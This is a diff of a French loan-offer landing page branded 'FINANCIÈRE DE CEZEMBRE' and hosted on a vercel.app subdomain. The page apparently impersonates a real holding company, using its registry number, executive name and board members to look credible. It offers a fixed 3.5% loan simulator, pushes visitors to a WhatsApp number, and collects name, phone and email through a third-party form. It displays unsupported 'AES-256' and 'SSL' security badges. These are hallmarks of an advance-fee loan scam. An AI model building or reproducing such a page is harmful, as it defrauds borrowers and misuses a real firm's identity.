@@ -3,72 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit Institutionnelles</title>
+    <title>FINANCIÈRE DE CEZEMBRE | Expertise Financière Privée</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        :root {
-            --navy: #001A4D;
-            --gold: #C5A059;
-            --light-bg: #F4F7FA;
-            --white: #FFFFFF;
-        }
-
+        :root { --navy: #001A4D; --gold: #C5A059; --light-bg: #F4F7FA; --white: #FFFFFF; --whatsapp: #25D366; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background-color: var(--white); color: #333; overflow-x: hidden; }
+        html { scroll-behavior: smooth; }
+        body { background-color: var(--white); color: #333; line-height: 1.6; }
 
-        /* HEADER INSTITUTIONNEL */
+        /* HEADER */
         header {
-            background: var(--white); padding: 20px 8%; display: flex;
+            background: var(--white); padding: 15px 8%; display: flex;
             justify-content: space-between; align-items: center;
             position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
-        .nav-links { display: flex; gap: 30px; align-items: center; }
-        .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; }
-        .lang-btn { background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .logo { font-weight: 700; font-size: 1.2rem; color: var(--navy); letter-spacing: 1px; }
+        .nav-links { display: flex; gap: 25px; align-items: center; }
+        .nav-links a { text-decoration: none; color: var(--navy); font-weight: 600; font-size: 0.85rem; }
 
-        /* HERO SECTION DYNAMIQUE */
+        /* LANGUES */
+        .lang-container { position: relative; cursor: pointer; }
+        .lang-active { background: #EEE; padding: 8px 15px; border-radius: 4px; display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 0.8rem; }
+        .lang-dropdown { display: none; position: absolute; top: 110%; right: 0; background: white; box-shadow: 0 10px 25px rgba(0,0,0,0.15); border-radius: 4px; min-width: 180px; z-index: 3000; }
+        .lang-dropdown.show { display: block; }
+        .lang-option { padding: 10px 15px; display: flex; align-items: center; gap: 12px; transition: 0.2s; color: #333; text-decoration: none; font-size: 0.85rem; border-bottom: 1px solid #EEE; }
+        .flag { width: 20px; height: 14px; object-fit: cover; }
+
+        /* HERO & SIMULATEUR */
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
-            background-size: cover; background-position: center;
-            display: flex; align-items: center; padding: 0 8%; color: var(--white);
+            background-size: cover; display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
-        .hero-content { max-width: 600px; }
-        .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
-        
-        /* SIMULATEUR PREMIUM */
         .simulator {
-            background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy);
+            background: var(--white); padding: 30px; border-radius: 4px; width: 420px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); margin-left: auto;
         }
-        .sim-row { margin-bottom: 25px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
-        input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); }
-        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; }
-        .result-area span { font-size: 2.2rem; font-weight: 700; color: var(--navy); }
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; margin-top: 20px; cursor: pointer; transition: 0.3s; }
-        .btn-main:hover { background: var(--gold); }
+        .sim-row { margin-bottom: 20px; }
+        input[type="range"] { width: 100%; accent-color: var(--gold); }
+        .result-area { background: var(--light-bg); padding: 20px; text-align: center; margin-bottom: 20px; border: 1px solid #E0E0E0; }
+        .result-area span { font-size: 1.8rem; font-weight: 700; color: var(--navy); }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
 
-        /* CHIFFRES ET RASSURANCE */
-        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
-        .stat-box h3 { font-size: 2rem; color: var(--gold); }
+        /* CONTACT SECTION */
+        .contact-section { padding: 100px 8%; background: linear-gradient(135deg, #001A4D 0%, #003366 100%); color: white; text-align: center; }
+        .contact-container { max-width: 800px; margin: 40px auto; background: rgba(255,255,255,0.05); padding: 50px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.1); }
+        
+        /* WHATSAPP FLOAT */
+        .whatsapp-float {
+            position: fixed; bottom: 30px; right: 30px; background: var(--whatsapp); color: white;
+            padding: 15px 25px; border-radius: 50px; display: flex; align-items: center; gap: 10px;
+            text-decoration: none; font-weight: 700; box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+            z-index: 5000; transition: 0.3s;
+        }
 
-        /* SECTION LONGUE (POUR GOOGLE) */
-        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
-        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
+        /* SOCIAL SHARE */
+        .share-btn { width: 45px; height: 45px; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; text-decoration: none; transition: 0.3s; }
 
-        /* MEGA FOOTER (L'ARMURE LÉGALE) */
-        footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
-        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
-        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+        /* MODALE */
+        #formModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; overflow-y: auto; padding: 20px; }
+        .modal-content { background: white; max-width: 550px; margin: 40px auto; padding: 35px; border-radius: 4px; position: relative; color: var(--navy); }
+        .close-modal { position: absolute; top: 15px; right: 20px; font-size: 1.8rem; cursor: pointer; color: #BBB; }
+        .security-badge { font-size: 0.7rem; color: #27ae60; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 15px; }
 
-        /* BOUTON TOP */
-        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
+        footer { background: #0A0A0A; color: #666; padding: 60px 8%; font-size: 0.75rem; text-align: center; }
+        .warning-box { border: 1px dashed #444; padding: 20px; margin-top: 30px; color: #999; font-weight: 700; text-transform: uppercase; }
     </style>
 </head>
 <body>
@@ -76,108 +77,125 @@
 <header>
     <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     <div class="nav-links">
-        <a href="#about">Notre Expertise</a>
-        <a href="#legal">Gouvernance</a>
-        <a href="#contact">Contact</a>
-        <div class="lang-btn"><i class="fas fa-globe-europe"></i> FR | EU</div>
+        <a href="#accueil">Accueil</a>
+        <a href="#contact">Contact Assistant</a>
+        <div class="lang-container" onclick="toggleLang()">
+            <div class="lang-active">
+                <img src="https://flagcdn.com/w20/fr.png" class="flag"> FR | EUR <i class="fas fa-chevron-down"></i>
+            </div>
+            <div id="langMenu" class="lang-dropdown">
+                <a href="#" class="lang-option"><img src="https://flagcdn.com/w20/fr.png" class="flag"> Français</a>
+                <a href="#" class="lang-option"><img src="https://flagcdn.com/w20/us.png" class="flag"> English</a>
+                <a href="#" class="lang-option"><img src="https://flagcdn.com/w20/es.png" class="flag"> Español</a>
+            </div>
+        </div>
     </div>
 </header>
 
-<section class="hero">
-    <div class="hero-content">
-        <h1>L'excellence financière <br>au service de vos projets.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
-        <div style="display: flex; gap: 20px;">
-            <i class="fas fa-shield-check" style="color: var(--gold); font-size: 2rem;"></i>
-            <p><strong>Société immatriculée au RCS 552 058 943</strong><br>Sous la supervision des autorités bancaires françaises.</p>
-        </div>
+<section id="accueil" class="hero">
+    <div style="max-width: 550px;">
+        <h1 style="font-size: 3.2rem; line-height: 1.1; margin-bottom: 25px;">Expertise Financière <br><span style="color:var(--gold)">Privée.</span></h1>
+        <p>SA au capital de 1 200 000 €. <br>RCS Quimper 552 058 943.</p>
     </div>
 
     <div class="simulator">
-        <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
+        <h3 style="text-align: center; margin-bottom: 25px; letter-spacing: 1px;">SIMULATION PRÊT 3.5%</h3>
         <div class="sim-row">
-            <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:700; width:80px;"> €</span></label>
-            <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
+            <label>MONTANT <span id="amtVal">15000</span> €</label>
+            <input type="range" id="amt" min="1000" max="75000" step="500" value="15000">
         </div>
         <div class="sim-row">
-            <label>DURÉE DU REMBOURSEMENT <span id="durText">36 mois</span></label>
-            <input type="range" id="durRange" min="6" max="84" step="6" value="36">
+            <label>DURÉE <span id="durVal">36</span> mois</label>
+            <input type="range" id="dur" min="6" max="84" step="6" value="36">
         </div>
         <div class="result-area">
-            <p style="font-size: 0.8rem; margin-bottom: 5px;">MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
-            <span id="monthlyRes">0.00</span> <span>€</span>
+            <p style="font-size: 0.65rem; color: #666; font-weight: 700;">MENSUALITÉ FIXE</p>
+            <span id="res">0.00</span> €
         </div>
-        <button class="btn-main">DÉPOSER MON DOSSIER</button>
+        <button class="btn-main" onclick="openForm()">DÉPOSER MON DOSSIER</button>
+        <div class="security-badge"><i class="fas fa-lock"></i> SÉCURISÉ SSL (VERCEL)</div>
     </div>
 </section>
 
-<section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
+<section id="contact" class="contact-section">
+    <h2 style="font-size: 2.5rem; color: var(--gold); margin-bottom: 20px;">Ligne Directe Secrétariat</h2>
+    <p style="max-width: 600px; margin: 0 auto; margin-bottom: 40px;">Échangez en toute confidentialité avec notre assistant via WhatsApp Business.</p>
+    
+    <div class="contact-container">
+        <a href="https://wa.me/33780976404" target="_blank" class="btn-main" style="background: var(--gold); text-decoration: none; display: inline-block; width: auto; padding: 18px 45px;">
+            <i class="fab fa-whatsapp"></i> ÉCHANGER PAR MESSAGE
+        </a>
+    </div>
 </section>
 
-<section class="about-section" id="about">
-    <h2>Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen. Notre engagement repose sur la transparence, le respect scrupuleux de la convention collective des établissements financiers et une conformité totale aux directives de l'ACPR.</p>
-</section>
-
-<footer id="legal">
-    <div class="f-grid">
-        <div>
-            <h4>FINANCIÈRE DE CEZEMBRE</h4>
-            <p>Distribution de crédit et participations financières régulées.<br>Identifiant LEI : 969500WONJGTDZG8E035</p>
-        </div>
-        <div>
-            <h4>SIÈGE SOCIAL</h4>
-            <p>ODET, 29500<br>ERGUÉ-GABÉRIC, France<br>RCS Quimper 552 058 943</p>
-        </div>
-        <div>
-            <h4>GOUVERNANCE</h4>
-            <p>Président : M. Michel Pajot<br>Administrateurs : Bolloré SE, Financière Arnil, Socotab.</p>
-        </div>
-        <div>
-            <h4>AUDIT</h4>
-            <p>Commissaire : Constantin Associés<br>Suppléant : BEAS (Paris La Défense)</p>
-        </div>
+<div style="text-align: center; padding: 40px 8%; background: #F4F7FA; border-top: 1px solid #EEE;">
+    <p style="font-size: 0.7rem; font-weight: 700; color: var(--navy); margin-bottom: 20px; letter-spacing: 1px;">PARTAGER CETTE PLATEFORME</p>
+    <div style="display: flex; justify-content: center; gap: 20px;">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https://p2p-finance-pro.vercel.app" target="_blank" class="share-btn" style="background: #3b5998;"><i class="fab fa-facebook-f"></i></a>
+        <a href="https://api.whatsapp.com/send?text=Découvrez cette solution de financement : https://p2p-finance-pro.vercel.app" target="_blank" class="share-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i></a>
+        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://p2p-finance-pro.vercel.app" target="_blank" class="share-btn" style="background: #0077b5;"><i class="fab fa-linkedin-in"></i></a>
     </div>
+</div>
 
-    <div class="legal-block">
-        <strong>INFORMATIONS LÉGALES ET RÉGLEMENTAIRES :</strong><br>
-        FINANCIÈRE DE CEZEMBRE SA au capital de 1 200 000 €. SIRET 552 058 943 00044. TVA FR05552058943. 
-        Conformément à la loi française, notre activité est soumise au contrôle de l'Autorité de Contrôle Prudentiel et de Résolution (ACPR). 
-        Le client dispose d'un droit de rétractation de 14 jours. L’offre est soumise à l’acceptation définitive du prêteur après analyse de la solvabilité.
-        <div class="tag-warning">
-            UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS DE REMBOURSEMENT AVANT DE VOUS ENGAGER.
-        </div>
+<a href="https://wa.me/33780976404" class="whatsapp-float" target="_blank">
+    <i class="fab fa-whatsapp" style="font-size: 1.5rem;"></i>
+    <span>Message Assistant</span>
+</a>
+
+<div id="formModal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeForm()">&times;</span>
+        <h2 style="font-size: 1.4rem;">Étude de solvabilité</h2>
+        <p id="recap" style="margin-bottom: 20px; font-weight: 700; color: var(--gold);"></p>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
+            <input type="hidden" name="simulation" id="hiddenData">
+            <input type="text" name="name" placeholder="Nom et Prénom" required style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #DDD;">
+            <input type="tel" name="phone" placeholder="Téléphone mobile" required style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #DDD;">
+            <input type="email" name="email" placeholder="Adresse E-mail" required style="width:100%; padding:12px; margin-bottom:20px; border:1px solid #DDD;">
+            <button type="submit" class="btn-main">VALIDER MA DEMANDE</button>
+            <div class="security-badge"><i class="fas fa-shield-alt"></i> CRYPTAGE AES-256 BIT</div>
+        </form>
     </div>
-    <p style="text-align:center; margin-top:40px; color:#555;">&copy; 2026 FINANCIÈRE DE CEZEMBRE - Tous droits réservés.</p>
+</div>
+
+<footer>
+    <p><strong>FINANCIÈRE DE CEZEMBRE SA</strong><br>
+    Société anonyme au capital de 1 200 000 €<br>
+    RCS Quimper 552 058 943 | SIREN 552 058 943<br>
+    Siège : ODET, 29500 ERGUÉ-GABÉRIC, France. Dirigeant : Michel Pajot.</p>
+    <div class="warning-box">
+        UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS DE REMBOURSEMENT AVANT DE VOUS ENGAGER.
+    </div>
 </footer>
 
-<div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
-
 <script>
-    const amtR = document.getElementById('amtRange');
-    const amtN = document.getElementById('amtNum');
-    const durR = document.getElementById('durRange');
-    const durT = document.getElementById('durText');
-    const resM = document.getElementById('monthlyRes');
+    const amt = document.getElementById('amt');
+    const dur = document.getElementById('dur');
+    const res = document.getElementById('res');
 
-    function calc() {
-        let p = amtR.value;
-        let n = durR.value;
+    function update() {
+        let p = amt.value; let n = dur.value;
+        document.getElementById('amtVal').innerText = Number(p).toLocaleString();
+        document.getElementById('durVal').innerText = n;
         let r = 0.035 / 12;
-        amtN.value = p;
-        durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        resM.innerText = m.toFixed(2);
+        res.innerText = m.toFixed(2);
+        document.getElementById('hiddenData').value = p + "€ / " + n + " mois / Mens: " + m.toFixed(2) + "€";
     }
 
-    amtR.oninput = calc;
-    durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
-    calc();
+    function toggleLang() { document.getElementById('langMenu').classList.toggle('show'); }
+    function openForm() { 
+        document.getElementById('formModal').style.display = 'block'; 
+        document.getElementById('recap').innerText = "VOTRE PROJET : " + amt.value + " € sur " + dur.value + " mois";
+    }
+    function closeForm() { document.getElementById('formModal').style.display = 'none'; }
+
+    amt.oninput = update; dur.oninput = update; update();
+    window.onclick = function(e) { 
+        if (e.target.closest('.lang-container') == null) document.getElementById('langMenu').classList.remove('show');
+        if (e.target == document.getElementById('formModal')) closeForm();
+    }
 </script>
 
 </body>
